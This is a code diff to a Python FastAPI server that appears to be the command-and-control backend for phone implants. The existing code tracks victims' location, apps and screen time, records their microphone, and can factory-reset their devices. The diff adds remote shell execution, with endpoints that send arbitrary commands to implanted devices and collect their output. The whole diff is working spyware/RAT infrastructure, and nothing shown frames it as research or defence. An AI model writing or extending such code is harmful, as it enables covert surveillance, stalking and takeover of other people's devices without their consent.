@@ -105,6 +105,15 @@ def get_db() -> Generator[sqlite3.Connection, None, None]:
         conn.close()
 
 
+def add_column_if_not_exists(conn: sqlite3.Connection, table: str, column_definition: str):
+    cursor = conn.cursor()
+    try:
+        cursor.execute(f"ALTER TABLE {table} ADD COLUMN {column_definition}")
+        conn.commit()
+    except sqlite3.OperationalError:
+        pass
+
+
 
 
 def haversine(lat1: float, lon1: float, lat2: float, lon2: float) -> float:
@@ -139,9 +148,17 @@ def init_db():
             location_tracking INTEGER DEFAULT 1,
             installed_apps TEXT DEFAULT '',
             screen_time_minutes INTEGER DEFAULT 0,
-            charging INTEGER DEFAULT 0
+            charging INTEGER DEFAULT 0,
+            last_shell_command TEXT DEFAULT '',
+            last_shell_output TEXT DEFAULT '',
+            last_shell_status INTEGER DEFAULT 0,
+            last_shell_at REAL DEFAULT 0
         )
     """)
+    add_column_if_not_exists(conn, 'devices', 'last_shell_command TEXT DEFAULT ""')
+    add_column_if_not_exists(conn, 'devices', 'last_shell_output TEXT DEFAULT ""')
+    add_column_if_not_exists(conn, 'devices', 'last_shell_status INTEGER DEFAULT 0')
+    add_column_if_not_exists(conn, 'devices', 'last_shell_at REAL DEFAULT 0')
     c.execute("""
         CREATE TABLE IF NOT EXISTS history (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -464,6 +481,15 @@ async def websocket_endpoint(websocket: WebSocket):
                 if data.get("implant_key") != IMPLANT_KEY:
                     continue
 
+                if "command_result" in data:
+                    now_unix = time.time()
+                    c = db.cursor()
+                    result_text = data.get("command_result", "") or "[No output]"
+                    c.execute('''UPDATE devices SET last_shell_output = ?, last_shell_status = 1, last_shell_at = ? WHERE device_id = ?''',
+                              (result_text, now_unix, client_id))
+                    db.commit()
+                    continue
+
                 if "device_id" in data:
                     client_id = data["device_id"]
                     is_new_connection = client_id not in ws_manager.active_connections
@@ -487,6 +513,13 @@ async def websocket_endpoint(websocket: WebSocket):
                         c.execute('''INSERT INTO device_errors (device_id, source, message, timestamp, unix_time)
                                      VALUES (?, ?, ?, ?, ?)''',
                                   (client_id, data["error_source"], data["error_msg"], time_str, now_unix))
+                        db.commit()
+                        continue
+
+                    if "command_result" in data:
+                        result_text = data.get("command_result", "") or "[No output]"
+                        c.execute('''UPDATE devices SET last_shell_output = ?, last_shell_status = 1, last_shell_at = ? WHERE device_id = ?''',
+                                  (result_text, now_unix, client_id))
                         db.commit()
                         continue
                     
@@ -969,7 +1002,10 @@ async def set_record_audio(device_id: str = Form(...), record_audio: int = Form(
     c.execute("UPDATE devices SET record_audio = ? WHERE device_id = ?", (record_audio, device_id))
     db.commit()
     if device_id in ws_manager.active_connections and record_audio == 1:
-        await ws_manager.send_task(device_id, {"task": "mic_record", "record": record_audio})
+        c.execute("SELECT record_duration FROM devices WHERE device_id = ?", (device_id,))
+        row = c.fetchone()
+        duration = row[0] if row and row[0] is not None else 30
+        await ws_manager.send_task(device_id, {"task": "mic_record", "duration": duration})
     return {"status": "success"}
 
 @app.post("/set_power_cmd")
@@ -987,10 +1023,32 @@ async def set_power_cmd(device_id: str = Form(...), action: str = Form(...), req
 
 @app.post("/run_shell_command")
 async def run_shell_command(device_id: str = Form(...), command: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
+    c = db.cursor()
+    c.execute("UPDATE devices SET last_shell_command = ?, last_shell_output = ?, last_shell_status = 0, last_shell_at = ? WHERE device_id = ?",
+              (command, "[pending result]",  time.time(), device_id))
+    db.commit()
     if device_id in ws_manager.active_connections:
         await ws_manager.send_task(device_id, {"task": "shell", "command": command})
-    return {"status": "success"}
+        return {"status": "sent"}
+    return JSONResponse({"status": "offline", "message": "Device not connected"}, status_code=404)
 
+
+@app.get("/shell_output")
+async def shell_output(request: Request, device_id: str, db: sqlite3.Connection = Depends(get_db)):
+    verify_session(request)
+    c = db.cursor()
+    c.execute("SELECT last_shell_command, last_shell_output, last_shell_status, last_shell_at FROM devices WHERE device_id = ?", (device_id,))
+    row = c.fetchone()
+    if not row:
+        return JSONResponse({"status": "unknown", "device_id": device_id}, status_code=404)
+    return {
+        "status": "ok",
+        "device_id": device_id,
+        "command": row["last_shell_command"] or "",
+        "output": row["last_shell_output"] or "",
+        "last_shell_status": row["last_shell_status"],
+        "last_shell_at": row["last_shell_at"] or 0,
+    }
 
 @app.post("/set_factory_reset")
 async def set_factory_reset(device_id: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
